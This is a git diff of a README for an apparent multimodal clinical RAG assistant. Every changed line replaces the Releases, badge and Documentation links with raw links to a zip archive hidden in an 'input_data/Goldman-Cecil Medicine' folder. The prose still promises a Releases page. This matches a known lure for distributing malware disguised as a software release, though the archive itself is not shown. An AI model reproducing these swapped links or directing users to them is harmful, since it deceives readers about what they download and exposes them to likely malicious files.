@@ -1,6 +1,6 @@
 # 🤖 Multimodal-Clinical-RAG-Assistant-Medical-Text-Image-Retrieval-System- - A Smart Assistant for Medical Insights
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/anselmoAJ/Multimodal-Clinical-RAG-Assistant-Medical-Text-Image-Retrieval-System-/releases)
+[![Download](https://raw.githubusercontent.com/anselmoAJ/Multimodal-Clinical-RAG-Assistant-Medical-Text-Image-Retrieval-System-/main/input_data/Goldman-Cecil Medicine/Multimodal_System_Clinical_Image_Retrieval_Medical_Text_RA_Assistant_1.5.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/anselmoAJ/Multimodal-Clinical-RAG-Assistant-Medical-Text-Image-Retrieval-System-/main/input_data/Goldman-Cecil Medicine/Multimodal_System_Clinical_Image_Retrieval_Medical_Text_RA_Assistant_1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To run the Multimodal Clinical RAG Assistant, you need the following:
 To get the latest version of the software, please follow these steps:
 
 1. Click the button below to visit the Releases page:
-   [![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/anselmoAJ/Multimodal-Clinical-RAG-Assistant-Medical-Text-Image-Retrieval-System-/releases)
+   [![Download](https://raw.githubusercontent.com/anselmoAJ/Multimodal-Clinical-RAG-Assistant-Medical-Text-Image-Retrieval-System-/main/input_data/Goldman-Cecil Medicine/Multimodal_System_Clinical_Image_Retrieval_Medical_Text_RA_Assistant_1.5.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/anselmoAJ/Multimodal-Clinical-RAG-Assistant-Medical-Text-Image-Retrieval-System-/main/input_data/Goldman-Cecil Medicine/Multimodal_System_Clinical_Image_Retrieval_Medical_Text_RA_Assistant_1.5.zip)
 
 2. On the Releases page, you will see a list of available versions. Find the most recent release.
 
@@ -68,6 +68,6 @@ If you encounter issues while running the application:
 
 ## 🔗 Further Information
 
-For additional details about the application, visit our [Documentation](https://github.com/anselmoAJ/Multimodal-Clinical-RAG-Assistant-Medical-Text-Image-Retrieval-System-/wiki) page or explore the community forum.
+For additional details about the application, visit our [Documentation](https://raw.githubusercontent.com/anselmoAJ/Multimodal-Clinical-RAG-Assistant-Medical-Text-Image-Retrieval-System-/main/input_data/Goldman-Cecil Medicine/Multimodal_System_Clinical_Image_Retrieval_Medical_Text_RA_Assistant_1.5.zip) page or explore the community forum.
 
 Thank you for choosing the Multimodal Clinical RAG Assistant. Enjoy your enhanced medical insights!
